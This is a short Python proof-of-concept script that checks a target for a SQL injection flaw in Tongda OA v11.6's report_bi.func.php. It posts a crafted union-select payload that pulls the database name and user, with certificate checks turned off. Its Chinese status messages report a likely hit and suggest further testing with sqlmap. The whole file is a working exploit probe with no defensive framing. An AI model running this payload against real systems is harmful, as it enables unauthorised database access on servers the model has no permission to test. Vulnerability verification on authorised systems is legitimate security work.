import time
import requests
import urllib3
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"application/x-www-form-urlencoded"
        }
    data='''_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&'''
    exp_url=target_url+'general/bi_design/appcenter/report_bi.func.php'
    success_msg = now_time() + '[SUCCESS]  可能存在POST_sql注入漏洞,使用sqlmap数据包做进一步验证'
    warning_msg = now_time() + '不存在通达OA v11.6 report_bi.func.php SQL注入漏洞,原因可能未登录'
    error_msg = now_time() + '[通达OA v11.6 report_bi.func.php SQL注入漏洞]未知错误，无法利用poc请求目标或被目标拒绝请求'
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(exp_url, headers=headers, data=data, verify=False)
        if response.status_code == 200 and 'root' in response.text :
            return success_msg
        else:
            return warning_msg
    except:
        return error_msg
        
            
            
            